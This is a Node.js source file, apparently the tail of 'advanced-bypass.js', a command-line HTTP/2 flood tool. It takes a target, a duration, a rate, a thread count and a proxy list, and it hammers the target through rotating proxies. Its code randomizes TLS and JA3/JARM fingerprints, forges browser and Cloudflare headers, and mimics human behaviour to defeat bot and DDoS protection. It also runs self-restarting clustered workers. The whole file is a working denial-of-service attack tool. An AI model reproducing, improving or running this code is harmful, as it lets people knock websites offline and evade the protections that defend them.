    generatePlatformVersion(platform) { return platform.includes('Windows') ? '"15.0.0"' : '"14.2.0"'; }
    generateTypingPattern() { return Array.from({length: 5}, () => Math.floor(Math.random() * 200) + 50).join(','); }
    generateScrollBehavior() { return `speed:${Math.floor(Math.random() * 100)},pause:${Math.floor(Math.random() * 500)}`; }
    analyzeHeaderFrequency(headers) { return headers.reduce((acc, h) => { acc[h.name] = (acc[h.name] || 0) + 1; return acc; }, {}); }
    calculateOptimalTableSize(freq) { return Math.max(4096, Object.keys(freq).length * 32); }
    applyProviderMutations(headers, provider) {
        if (provider === 'Cloudflare') {
            headers['x-cloudflare-bot-score'] = Math.floor(Math.random() * 80 + 20).toString();
        }
    }
    generateJARMFingerprint() {
        const jarmSeeds = [
            '29d3fd00029d29d00042d43d000000-5f0e7b6d6e6f1f2d3e4f5a6b7c8d9e0a',
            '27d40d40d00027d41d41c000000000-f1e2d3c4b5a69788f9e0a1b2c3d4e5f6'
        ];
        return jarmSeeds[Math.floor(Math.random() * jarmSeeds.length)];
    }
    generateDeviceSignature() {
        return crypto.randomBytes(32).toString('base64').replace(/[+/=]/g, '');
    }
    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }
}

process.setMaxListeners(50);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const cplist = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
    'TLS_RSA_WITH_AES_128_GCM_SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305'
];

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1:secp521r1", "x25519:secp256r1", "prime256v1"];
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;
const sharedTicketKeys = crypto.randomBytes(48);

const secureop = {
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    ticketKeys: sharedTicketKeys
};

const secureContext = tls.createSecureContext(secureop);

const hpack = new AdvancedHPACKSimulator();
const fingerprintGen = new BrowserFingerprintGenerator();
const redirectHandler = new AdvancedRedirectHandler({ maxRedirects: 15 });
const ultimateBypass = new UltimateHTTP2Bypass({
    bfm: true,
    ddos: true,
    cache: true,
    redirect: true,
    fingerprint: true,
    behavioral: true,
    neural: true,
    stealth: false,
    jarm: false
});

const [,, host, time, rate, thread, proxyfile, ...args] = process.argv;
const options = {
    useAll: args.includes('--all'),
    randpath: args.includes('--randpath') || args.includes('--all'),
    highbypass: args.includes('--bypass') || args.includes('--all'),
    cachebypass: args.includes('--cache') || args.includes('--all'),
    fullheaders: args.includes('--full') || args.includes('--all'),
    extraheaders: args.includes('--extra') || args.includes('--all'),
    queryopt: args.includes('--query') || args.includes('--all'),
    fingerprintopt: args.includes('--fingerprint') || args.includes('--all'),
    ratelimitopt: args.includes('--ratelimit') || args.includes('--all'),
    redirect: args.includes('--redirect') || args.includes('--all'),
    npath: args.includes('--npath') || args.includes('--all'),
    bfm: args.includes('--bfm') || args.includes('--all'),
    ddos: args.includes('--ddos') || args.includes('--all'),
    behavioral: args.includes('--behavioral') || args.includes('--all'),
    neural: args.includes('--neural') || args.includes('--all'),
    stealth: args.includes('--stealth') || args.includes('--all'),
    jarm: args.includes('--jarm') || args.includes('--all'),
    proxytype: args.includes('--type') ? args[args.indexOf('--type') + 1] : 'http',
    info: args.includes('--info')
};

if (options.useAll) {
    options.randpath = !args.includes('--all-randpath') && options.randpath;
    options.highbypass = !args.includes('--all-bypass') && options.highbypass;
    options.cachebypass = !args.includes('--all-cache') && options.cachebypass;
    options.fullheaders = !args.includes('--all-full') && options.fullheaders;
    options.extraheaders = !args.includes('--all-extra') && options.extraheaders;
    options.queryopt = !args.includes('--all-query') && options.queryopt;
    options.fingerprintopt = !args.includes('--all-fingerprint') && options.fingerprintopt;
    options.ratelimitopt = !args.includes('--all-ratelimit') && options.ratelimitopt;
    options.redirect = !args.includes('--all-redirect') && options.redirect;
    options.npath = !args.includes('--all-npath') && options.npath;
    options.bfm = !args.includes('--all-bfm') && options.bfm;
    options.ddos = !args.includes('--all-ddos') && options.ddos;
    options.behavioral = !args.includes('--all-behavioral') && options.behavioral;
    options.neural = !args.includes('--all-neural') && options.neural;
    options.stealth = !args.includes('--all-stealth') && options.stealth;
    options.jarm = !args.includes('--all-jarm') && options.jarm;
}

if (!host || !time || !rate || !thread || !proxyfile || !['http', 'socks4', 'socks5'].includes(options.proxytype.toLowerCase())) {
    console.log(`node advanced-bypass.js host time rate thread proxy.txt [options]`);
    console.log(`Options:`);
    console.log(`  --randpath: Randomize request paths`);
    console.log(`  --bypass: Enable advanced anti-bot bypass`);
    console.log(`  --cache: Bypass cache with random queries`);
    console.log(`  --full: Include full browser headers`);
    console.log(`  --extra: Add extra evasion headers`);
    console.log(`  --query: Optimize queries with random parameters`);
    console.log(`  --fingerprint: Enable TLS and browser fingerprinting`);
    console.log(`  --ratelimit: Handle rate limiting dynamically`);
    console.log(`  --redirect: Enable handling of 301, 302, 307 redirects`);
    console.log(`  --npath: Attack raw URL without additional paths`);
    console.log(`  --bfm: Enable Cloudflare Bot Fighting Mode bypass`);
    console.log(`  --ddos: Enable DDoS protection bypass`);
    console.log(`  --behavioral: Enable behavioral mimicry`);
    console.log(`  --neural: Enable neural pattern adaptation`);
    console.log(`  --stealth: Enable maximum anti-detection randomization`);
    console.log(`  --jarm: Enable JARM fingerprint randomization`);
    console.log(`  --all: Enable all options`);
    console.log(`  --all-<option>: Disable specific option when using --all (e.g., --all-ratelimit)`);
    console.log(`  --type <http/socks4/socks5>: Specify proxy type`);
    console.log(`  --info: Display attack configuration`);
    process.exit(1);
}

let proxies = [];
try {
    if (!fs.existsSync(proxyfile)) {
        console.error(`Proxy file ${proxyfile} does not exist`);
        process.exit(1);
    }
    proxies = fs.readFileSync(proxyfile, 'utf-8')
        .split('\n')
        .map(line => line.trim())
        .filter(line => line.length > 0 && line.includes(':'));
    if (proxies.length === 0) {
        console.error(`Proxy file ${proxyfile} is empty or contains no valid proxies`);
        process.exit(1);
    }
} catch (err) {
    console.error(`Error reading proxy file ${proxyfile}: ${err.message}`);
    process.exit(1);
}

try {
    if (!host.startsWith('http://') && !host.startsWith('https://')) {
        throw new Error('Host must include http:// or https://');
    }
    new URL(host);
    if (isNaN(parseInt(time)) || parseInt(time) <= 0) {
        throw new Error('Time must be a positive number');
    }
    if (isNaN(parseInt(rate)) || parseInt(rate) <= 0) {
        throw new Error('Rate must be a positive number');
    }
    if (isNaN(parseInt(thread)) || parseInt(thread) <= 0) {
        throw new Error('Thread must be a positive number');
    }
} catch (err) {
    console.error(`Invalid input: ${err.message}`);
    process.exit(1);
}

const connectionPool = new Map();
const MAX_CONNECTIONS_PER_WORKER = 10;

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)] || arr[0] || null;
}

function random_string(length, chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") {
    return Array.from(crypto.randomBytes(length))
        .map(b => chars[b % chars.length])
        .join('');
}

function randomBase64(length) {
    return Buffer.from(crypto.randomBytes(Math.ceil(length * 3/4)))
        .toString('base64')
        .replace(/=/g, '')
        .slice(0, length);
}

function randomHex(length) {
    return crypto.randomBytes(Math.ceil(length/2))
        .toString('hex')
        .slice(0, length);
}

function generateAdvancedPath(hostname) {
    if (options.npath) {
        return '/';
    }

    let path = host.replace('%RAND%', random_string(randomInt(3, 8)));
    if (!options.randpath) {
        try {
            return new URL(path).pathname || '/';
        } catch {
            return '/';
        }
    }

    const basePaths = ['/', '/api', '/login', '/search', '/home', '/dashboard'];
    path = `${randomElement(basePaths)}/${random_string(randomInt(3, 8))}`;
    
    if (options.cachebypass || options.queryopt) {
        const params = [];
        params.push(`cb=${randomHex(8)}`);
        params.push(`ts=${Date.now()}`);
        params.push(`r=${random_string(6)}`);
        path += `?${params.join('&')}`;
    }
    
    return path;
}

function fixJA3Fingerprint() {
    const ja3Variants = [
        "769,49195,0-4-5-6-10-11-14-15-16-18-23-29-33-36-39-51-53,0-1-2-4,0",
        "772,4865-4866-4867-49195-49196,0-23-65281-10-11-35-16-5-13,29-23-24,0",
        "771,4865-4866-4867,0-23-65281-10-11-35-16-5-13-18,29-23-24-25,0"
    ];
    return crypto.createHash('md5').update(randomElement(ja3Variants)).digest('hex');
}

function generate_headers(proxy, hostname, fingerprint, sessionId) {
    try {
        const browser = fingerprint.browser;
        const isChrome = browser === 'Chrome';
        const isFirefox = browser === 'Firefox';
        const isEdge = browser === 'Edge';
        const isSafari = browser === 'Safari';
        
        let provider = 'Cloudflare';
        try {
            provider = ultimateBypass.detectProvider(host).then(p => p || 'Cloudflare').catch(() => 'Cloudflare');
        } catch {}

        const ultimateHeaders = ultimateBypass.generateDynamicHeaders(host, {
            provider,
            method: Math.random() < 0.9 ? 'GET' : 'POST',
            fetchDest: 'document',
            fetchMode: 'navigate',
            fetchSite: 'none',
            path: generateAdvancedPath(hostname)
        });

        const headers = {
            ':method': ultimateHeaders[':method'],
            ':authority': hostname,
            ':scheme': 'https',
            ':path': ultimateHeaders[':path'],
            'user-agent': ultimateHeaders['user-agent'],
            'accept': ultimateHeaders['accept'],
            'accept-language': ultimateHeaders['accept-language'],
            'accept-encoding': ultimateHeaders['accept-encoding'],
            'cache-control': ultimateHeaders['cache-control'],
            'sec-fetch-dest': ultimateHeaders['sec-fetch-dest'],
            'sec-fetch-mode': ultimateHeaders['sec-fetch-mode'],
            'sec-fetch-site': ultimateHeaders['sec-fetch-site'],
            'sec-fetch-user': ultimateHeaders['sec-fetch-user'],
            'cf-ipcountry': redirectHandler.getRandomCountryCode()
        };

        if (options.cachebypass) {
            Object.assign(headers, ultimateHeaders['cache-control'] ? {} : {
                'cache-control': 'no-cache, no-store, must-revalidate',
                'pragma': 'no-cache',
                'if-modified-since': new Date(Date.now() - 86400000).toUTCString()
            });
        }

        if (isChrome || isEdge) {
            Object.assign(headers, {
                'sec-ch-ua': ultimateHeaders['sec-ch-ua'],
                'sec-ch-ua-mobile': ultimateHeaders['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': ultimateHeaders['sec-ch-ua-platform'],
                'sec-ch-ua-platform-version': ultimateHeaders['sec-ch-ua-platform-version'],
                'upgrade-insecure-requests': '1'
            });
        } else if (isFirefox) {
            Object.assign(headers, {
                'accept': ultimateHeaders['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept-language': ultimateHeaders['accept-language'] || 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
                'accept-encoding': ultimateHeaders['accept-encoding'] || 'gzip, deflate, br',
                'dnt': '1',
                'upgrade-insecure-requests': '1',
                'te': 'trailers'
            });
        } else if (isSafari) {
            Object.assign(headers, {
                'accept': ultimateHeaders['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': ultimateHeaders['accept-language'] || 'en-US,en;q=0.9',
                'accept-encoding': ultimateHeaders['accept-encoding'] || 'gzip, deflate',
                'connection': 'keep-alive'
            });
        }

        if (options.fullheaders) {
            Object.assign(headers, {
                'sec-ch-ua-arch': ultimateHeaders['sec-ch-ua-arch'] || (fingerprint.platform.includes('Windows') || fingerprint.platform.includes('Linux') ? '"x86"' : '"arm"'),
                'sec-ch-ua-bitness': ultimateHeaders['sec-ch-ua-bitness'] || '"64"',
                'sec-ch-ua-full-version': ultimateHeaders['sec-ch-ua-full-version'] || `"${fingerprint.version}"`
            });
        }

        if (options.highbypass || options.bfm) {
            const cookies = fingerprintGen.generateAdvancedCookies(hostname, sessionId);
            Object.assign(headers, {
                'cookie': cookies,
                'x-requested-with': ultimateHeaders['x-requested-with'] || (Math.random() > 0.8 ? 'XMLHttpRequest' : null),
                'x-forwarded-for': ultimateHeaders['x-forwarded-for'] || `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 254)}`,
                'x-real-ip': ultimateHeaders['x-real-ip'] || proxy.split(':')[0],
                'x-cloudflare-bot-score': ultimateHeaders['x-cloudflare-bot-score'] || Math.floor(Math.random() * 80 + 20).toString()
            });
        }

        if (options.extraheaders) {
            Object.assign(headers, {
                'x-forwarded-proto': 'https',
                'x-forwarded-scheme': 'https',
                'x-forwarded-host': hostname,
                'x-request-id': ultimateHeaders['x-request-id'] || crypto.randomUUID()
            });
        }

        if (options.fingerprintopt || options.stealth) {
            Object.assign(headers, {
                'x-tls-fingerprint': ultimateHeaders['x-tls-fingerprint'] || fixJA3Fingerprint(),
                'x-canvas-fingerprint': ultimateHeaders['x-canvas-fingerprint'] || fingerprint.canvas,
                'x-webgl-fingerprint': ultimateHeaders['x-webgl-fingerprint'] || fingerprint.webgl,
                'x-audio-fingerprint': ultimateHeaders['x-audio-fingerprint'] || fingerprint.audio,
                'x-timezone': ultimateHeaders['x-timezone'] || fingerprint.timezone,
                'x-viewport': ultimateHeaders['x-viewport'] || fingerprint.viewport,
                'sec-ch-viewport-width': ultimateHeaders['sec-ch-viewport-width'] || fingerprint.viewport.width.toString(),
                'sec-ch-viewport-height': ultimateHeaders['sec-ch-viewport-height'] || fingerprint.viewport.height.toString(),
                'sec-ch-dpr': ultimateHeaders['sec-ch-dpr'] || fingerprint.devicePixelRatio.toString(),
                'x-webrtc-enabled': ultimateHeaders['x-webrtc-enabled'] || (fingerprint.webrtc.enabled ? 'true' : 'false')
            });
        }

        if (Math.random() > 0.3 || options.stealth) {
            const referers = [
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://www.youtube.com/',
                `https://${hostname}/`
            ];
            headers['referer'] = ultimateHeaders['referer'] || randomElement(referers);
        }

        if (options.behavioral || options.stealth) {
            Object.assign(headers, {
                'x-mouse-movement': ultimateHeaders['x-mouse-movement'] || ultimateBypass.generateMousePattern(),
                'x-typing-pattern': ultimateHeaders['x-typing-pattern'] || ultimateBypass.generateTypingPattern(),
                'x-scroll-behavior': ultimateHeaders['x-scroll-behavior'] || ultimateBypass.generateScrollBehavior()
            });
        }

        if (options.stealth) {
            Object.assign(headers, {
                'x-stealth-token': ultimateHeaders['x-stealth-token'] || crypto.randomBytes(16).toString('hex'),
                'x-human-entropy': ultimateHeaders['x-human-entropy'] || ultimateBypass.generateEntropyVector(),
                'x-device-signature': ultimateHeaders['x-device-signature'] || ultimateBypass.generateDeviceSignature()
            });
        }

        if (options.jarm) {
            headers['x-jarm-fingerprint'] = ultimateHeaders['x-jarm-fingerprint'] || ultimateBypass.generateJARMFingerprint();
        }

        if (headers[':method'] === 'POST') {
            const postData = random_string(randomInt(10, 50));
            Object.assign(headers, {
                'content-length': Buffer.from(postData, 'utf-8').length,
                'content-type': 'application/x-www-form-urlencoded'
            });
        }

        return headers;
    } catch {
        return {};
    }
}

function createAdvancedTLSSocket(socket, hostname) {
    try {
        const cipher = randomElement(cplist);
        const curve = randomElement(ecdhCurve);
        return tls.connect({
            socket,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: cipher,
            sigalgs: sigalgs,
            ecdhCurve: curve,
            secureContext: secureContext,
            honorCipherOrder: true,
            rejectUnauthorized: false,
            servername: hostname,
            maxVersion: 'TLSv1.3',
            minVersion: 'TLSv1',
            requestOCSP: true,
            session: options.stealth ? crypto.randomBytes(64) : null
        });
    } catch {
        return null;
    }
}

function getOptimizedHttp2SettingsByISP(isp) {
    const defaultSettings = {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxFrameSize: 16384,
        maxHeaderListSize: 262144,
        enablePush: false
    };
    return defaultSettings;
}

async function flood(endTime, retryCount = 0) {
    if (retryCount > 3) return;

    let proxy, proxyhost, proxyport, proxyuser, proxypass, proxyStr;
    try {
        proxy = randomElement(proxies);
        if (!proxy) return;
        proxy = proxy.split(':');
        if (!proxy[0] || !proxy[1]) return;
        proxyhost = proxy[0];
        proxyport = parseInt(proxy[1]);
        proxyuser = proxy.length > 2 ? proxy[2] : null;
        proxypass = proxy.length > 3 ? proxy[3] : null;
        proxyStr = `${proxyhost}:${proxyport}`;
    } catch {
        setTimeout(() => flood(endTime, retryCount + 1), 500);
        return;
    }

    const hostname = new URL(host).hostname;
    const fingerprint = fingerprintGen.getRandomFingerprint();
    const sessionId = randomHex(16);

    let socket;
    const connectOptions = {
        host: hostname,
        port: 443,
        timeout: 5000
    };

    const createConnection = (callback) => {
        try {
            if (options.proxytype.toLowerCase() === 'http') {
                socket = net.connect({ host: proxyhost, port: proxyport }, () => {
                    const connectReq = 
                        `CONNECT ${hostname}:443 HTTP/1.1\r\n` +
                        `Host: ${hostname}:443\r\n` +
                        `User-Agent: ${fingerprint.ua}\r\n` +
                        `Proxy-Connection: Keep-Alive\r\n` +
                        (proxyuser && proxypass ? `Proxy-Authorization: Basic ${Buffer.from(`${proxyuser}:${proxypass}`).toString('base64')}\r\n` : '') +
                        `\r\n`;
                    socket.write(connectReq);
                });
                
                let response = '';
                socket.on('data', (chunk) => {
                    response += chunk.toString();
                    if (response.includes('\r\n\r\n')) {
                        const statusLine = response.split('\r\n')[0];
                        const statusCode = statusLine.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1];
                        if (statusCode === '200') {
                            callback(null, socket);
                        } else {
                            callback(new Error());
                        }
                        socket.removeAllListeners('data');
                    }
                });
            } else {
                socks.createConnection({
                    proxy: {
                        host: proxyhost,
                        port: proxyport,
                        type: options.proxytype.toLowerCase() === 'socks5' ? 5 : 4,
                        ...(proxyuser && proxypass && { userId: proxyuser, password: proxypass })
                    },
                    command: 'connect',
                    destination: connectOptions,
                    timeout: 5000
                }, (err, info) => {
                    if (err) return callback(err);
                    callback(null, info.socket);
                });
            }
        } catch {
            callback(new Error());
        }
    };

    createConnection((err, socket) => {
        if (err) {
            setTimeout(() => flood(endTime, retryCount + 1), 500);
            return;
        }

        let isCleaningUp = false;
        socket.setTimeout(5000);

        const tlsSocket = createAdvancedTLSSocket(socket, hostname);
        if (!tlsSocket) {
            setTimeout(() => flood(endTime, retryCount + 1), 500);
            return;
        }
        
        const cleanup = () => {
            if (isCleaningUp) return;
            isCleaningUp = true;
            try {
                if (client) client.close();
                if (tlsSocket) tlsSocket.destroy();
                if (socket) socket.destroy();
                connectionPool.delete(proxyStr);
            } catch {}
        };

        let client;

        tlsSocket.on('secureConnect', async () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
                cleanup();
                return;
            }

            const isps = [
                'Cloudflare, Inc.', 'FDCservers.net', 'OVH SAS', 'VNXCLOUD',
                'Akamai Technologies, Inc.', 'Fastly, Inc.', 'Ddos-guard LTD',
                'Amazon.com, Inc.', 'Microsoft Corporation', 'Google LLC'
            ];
            const isp = randomElement(isps);
            const settings = getOptimizedHttp2SettingsByISP(isp);

            try {
                client = http2.connect(host, {
                    createConnection: () => tlsSocket,
                    settings
                });
            } catch {
                cleanup();
                return;
            }

            connectionPool.set(proxyStr, { client, tlsSocket, socket, lastUsed: Date.now() });

            let statusCounts = {};
            let totalRequests = 0;
            let currentRate = parseInt(rate);
            let lastLogTime = Date.now();
            let lastResetTime = Date.now();
            let consecutiveErrors = 0;
            let sessionStart = Date.now();
            let currentUrl = host;

            const sendRequest = async () => {
                if (Date.now() >= endTime || client.destroyed || consecutiveErrors > 5 || Date.now() - sessionStart >= 5000) {
                    cleanup();
                    if (Date.now() < endTime) {
                        setTimeout(() => flood(endTime, retryCount + 1), 500);
                    }
                    return;
                }

                try {
                    let headers = generate_headers(proxyStr, hostname, fingerprint, sessionId);
                    if (!Object.keys(headers).length) throw new Error();
                    hpack.compressHeaders(headers);
                    const req = client.request(headers, {
                        endStream: headers[':method'] === 'GET'
                    });

                    let responseBody = '';
                    let responseHeaders = {};

                    req.on('response', async (headers) => {
                        responseHeaders = headers;
                        const status = headers[':status'];
                        statusCounts[status] = (statusCounts[status] || 0) + 1;
                        totalRequests++;
                        consecutiveErrors = 0;

                        if (options.redirect && [301, 302, 307].includes(status)) {
                            try {
                                const redirectResult = await redirectHandler.handleRedirect(
                                    { ...headers, body: responseBody },
                                    currentUrl,
                                    { customHeaders: headers }
                                );
                                if (redirectResult && redirectResult.redirectUrl) {
                                    currentUrl = redirectResult.redirectUrl;
                                    headers = { ...headers, ...redirectResult.redirectOptions.customHeaders };
                                    const newReq = client.request(headers, {
                                        endStream: headers[':method'] === 'GET'
                                    });
                                    newReq.on('response', (newHeaders) => {
                                        responseHeaders = newHeaders;
                                        statusCounts[newHeaders[':status']] = (statusCounts[newHeaders[':status']] || 0) + 1;
                                        totalRequests++;
                                    });
                                    newReq.on('data', (chunk) => {
                                        responseBody += chunk.toString();
                                    });
                                    newReq.on('end', () => {});
                                    newReq.on('error', () => {
                                        consecutiveErrors++;
                                        if (consecutiveErrors > 5) {
                                            cleanup();
                                            setTimeout(() => flood(endTime, retryCount + 1), 500);
                                        }
                                    });
                                    if (headers[':method'] === 'POST') {
                                        const postData = random_string(randomInt(10, 50));
                                        newReq.write(postData);
                                        newReq.end();
                                    }
                                }
                            } catch {
                                consecutiveErrors++;
                            }
                        }

                        if (Date.now() - lastLogTime >= 3000) {
                            const statusText = Object.entries(statusCounts).map(([k, v]) => `${k}: ${v}`).join(', ');
                            const label = '\x1b[38;2;7;140;255mT\x1b[38;2;21;130;255mr\x1b[38;2;35;121;255me\x1b[38;2;49;112;255mT\x1b[38;2;63;102;255mr\x1b[38;2;77;93;255ma\x1b[38;2;91;84;255mu\x1b[38;2;105;74;255m \x1b[38;2;119;65;255mN\x1b[38;2;133;56;255me\x1b[38;2;147;46;255mt\x1b[38;2;161;37;255mw\x1b[38;2;175;28;255mo\x1b[38;2;189;18;255mr\x1b[38;2;203;9;255mk\x1b[38;2;217;0;255m\033[0m';
                            console.log(`[${label}] | Target: [\x1b[4m${host}\x1b[0m] | Requests: ${totalRequests} | Status: [${statusText}]`);
                            lastLogTime = Date.now();
                            if (Date.now() - lastResetTime >= 60000) {
                                statusCounts = {};
                                lastResetTime = Date.now();
                            }
                        }

                        if (options.ratelimitopt && status === 429) {
                            currentRate = Math.max(10, Math.floor(currentRate * ultimateBypass.neuralPatterns.neuralAdaptation.responseAdjustment(status)));
                            setTimeout(() => {
                                currentRate = Math.min(parseInt(rate), Math.floor(currentRate * 1.2));
                            }, 5000);
                        }
                    });

                    req.on('data', (chunk) => {
                        responseBody += chunk.toString();
                    });
                    req.on('end', () => {});
                    req.on('error', () => {
                        consecutiveErrors++;
                        if (consecutiveErrors > 5) {
                            cleanup();
                            setTimeout(() => flood(endTime, retryCount + 1), 500);
                        }
                    });

                    if (headers[':method'] === 'POST') {
                        const postData = random_string(randomInt(10, 50));
                        req.write(postData);
                        req.end();
                    }

                    if (!client.destroyed && totalRequests % 10 === 0) {
                        setImmediate(sendRequest);
                    } else {
                        const delay = Math.max(5, 1000 / (currentRate * (options.stealth ? ultimateBypass.neuralPatterns.neuralAdaptation.entropyInjection() : 2)));
                        setTimeout(sendRequest, delay);
                    }
                } catch {
                    consecutiveErrors++;
                    if (consecutiveErrors > 5) {
                        cleanup();
                        setTimeout(() => flood(endTime, retryCount + 1), 500);
                    } else {
                        setImmediate(sendRequest);
                    }
                }
            };

            for (let i = 0; i < 10; i++) {
                setTimeout(sendRequest, i * (options.stealth ? ultimateBypass.neuralPatterns.humanBehavior.clickDelay() : 10));
            }
        });

        tlsSocket.on('error', () => {
            if (!isCleaningUp) {
                cleanup();
                setTimeout(() => flood(endTime, retryCount + 1), 500);
            }
        });

        socket.on('timeout', () => {
            if (!isCleaningUp) {
                cleanup();
                setTimeout(() => flood(endTime, retryCount + 1), 500);
            }
        });

        socket.on('error', () => {
            if (!isCleaningUp) {
                cleanup();
                setTimeout(() => flood(endTime, retryCount + 1), 500);
            }
        });
    });
}

function start() {
    const endTime = Date.now() + parseInt(time) * 1000;

    if (options.info) {
        console.log('=== Attack Information ===');
        console.log(`Target: ${host}`);
        console.log(`Duration: ${time} seconds`);
        console.log(`Rate: ${rate} requests/second`);
        console.log(`Threads: ${thread}`);
        console.log(`Proxy File: ${proxyfile} (${proxies.length} proxies)`);
        console.log(`Proxy Type: ${options.proxytype}`);
        console.log('Options Enabled:');
        console.log(`  Random Path: ${options.randpath}`);
        console.log(`  High Bypass: ${options.highbypass}`);
        console.log(`  Cache Bypass: ${options.cachebypass}`);
        console.log(`  Full Headers: ${options.fullheaders}`);
        console.log(`  Extra Headers: ${options.extraheaders}`);
        console.log(`  Query Optimization: ${options.queryopt}`);
        console.log(`  Fingerprint: ${options.fingerprintopt}`);
        console.log(`  Rate Limiting: ${options.ratelimitopt}`);
        console.log(`  Redirect: ${options.redirect}`);
        console.log(`  No Path: ${options.npath}`);
        console.log(`  BFM Bypass: ${options.bfm}`);
        console.log(`  DDoS Protection Bypass: ${options.ddos}`);
        console.log(`  Behavioral Mimicry: ${options.behavioral}`);
        console.log(`  Neural Adaptation: ${options.neural}`);
        console.log(`  Stealth Mode: ${options.stealth}`);
        console.log(`  JARM Randomization: ${options.jarm}`);
        console.log(`  All Options: ${options.useAll}`);
        console.log('=========================');
    }

    if (cluster.isPrimary) {
        console.log(`Attack Successfully Sent With ${thread} Thread`);
        for (let i = 0; i < parseInt(thread); i++) {
            cluster.fork();
        }

        cluster.on('exit', () => {
            console.log(` Restarting...`);
            cluster.fork();
        });
        setTimeout(() => {
            console.log('Attack completed');
            Object.values(cluster.workers).forEach(worker => worker.kill());
            process.exit(0);
        }, parseInt(time) * 1000);

        setInterval(() => {
            for (const [proxy, conn] of connectionPool.entries()) {
                if (Date.now() - conn.lastUsed > 10000) {
                    try {
                        conn.client.close();
                        conn.tlsSocket.destroy();
                        conn.socket.destroy();
                        connectionPool.delete(proxy);
                    } catch (err) {
                        // Silently ignore cleanup errors
                    }
                }
            }
        }, 5000);
    } else {
        function runWorker() {
            if (Date.now() >= endTime) {
                return process.exit(0);
            }
            if (connectionPool.size < MAX_CONNECTIONS_PER_WORKER) {
                flood(endTime);
            }
            setImmediate(runWorker);
        }
        runWorker();
    }
}
start()